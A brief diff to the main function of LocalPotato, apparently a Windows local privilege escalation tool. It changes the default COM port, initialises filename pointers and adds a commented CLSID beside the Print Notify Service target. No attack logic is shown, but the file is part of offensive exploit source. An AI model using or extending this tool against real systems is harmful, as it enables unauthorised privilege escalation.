@@ -6,17 +6,17 @@
 #include <winternl.h>
 #include <Psapi.h>
 void usage();
-wchar_t* destfname;
-wchar_t* inputfname;
+wchar_t* destfname=NULL;
+wchar_t* inputfname=NULL;
 
 
 int wmain(int argc, wchar_t** argv) 
 {
 	printf("\n\n\t LocalPotato\n");
 	printf("\t by splinter_code & decoder_it\n\n");
-
+	//{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}
 	WCHAR defaultClsidStr[] = L"{854A20FB-2D44-457D-992F-EF13785D2B51}"; // Print Notify Service CLSID
-	WCHAR defaultComPort[] = L"12345";
+	WCHAR defaultComPort[] = L"10247";
 	PWCHAR clsidStr = defaultClsidStr;
 	PWCHAR comPort = defaultComPort;
 	int cnt = 1;
